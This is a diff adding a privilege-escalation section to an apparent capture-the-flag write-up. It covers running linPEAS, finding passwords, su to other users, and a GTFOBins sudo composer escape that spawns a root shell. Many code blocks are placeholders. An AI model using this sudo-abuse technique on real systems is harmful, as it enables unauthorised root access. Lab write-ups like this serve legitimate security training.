@@ -387,8 +387,80 @@ drwxrwxr-x 3 mrb3n mrb3n 4096 Aug 12 22:19 .local/
 -rw------- 1 mrb3n mrb3n  685 Feb  2 13:02 .viminfo
 ```
 
-# Privilege Escalation#1
+We see **user.txt** in */home/cry0l1t3* and inteteresting *.sudo_as_admin_successful* in /home/egre55.
 
-# Privilege Escalation#2
+# Privilege Escalation
 
+Let's Download [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and check way privilege escalation.
+
+```
+wget
+```
+
+And we find password in /
+
+```
+pass
+```
+
+Try to login as cry0l1t3 with password.
+
+```
+su cry0l1t3
+```
+
+And we have success. Get user.txt
+
+```
+user.txt
+```
+
+Checkig privelages.
+```
+sudo -l
+```
+
+and all users privelages:
+```
+
+```
+Сry0l1t3 belongs to the adminsitrator group, that can read logs in /var/log
+
+Run linPEAS as Сry0l1t3 to check every logs.
+
+We find mrb3n password:
+
+```
+pass
+```
+
+Login as mrb3n and check privelages
+```
+sudo -l
+```
+
+He can run as sudo **/usr/bin composer**. Lets run composer.
+```
+composer
+```
+
+Ok, we need json file in /tmp to run it. Also composer can run scripts, so...
+Checking [GTFObins](https://gtfobins.github.io/gtfobins/composer/)
+
+```
+TF=$(mktemp -d)
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+sudo composer --working-dir=$TF run-script x
+```
+
+And we got root /bin/bash. Get root.txt
+```
+root.txt
+```
+
+# Resources
+
+1. https://github.com/aljavier/exploit_laravel_cve-2018-15133
+2. https://null-byte.wonderhowto.com/how-to/scan-websites-for-interesting-directories-files-with-gobuster-0197226/
+3. https://gtfobins.github.io/
 
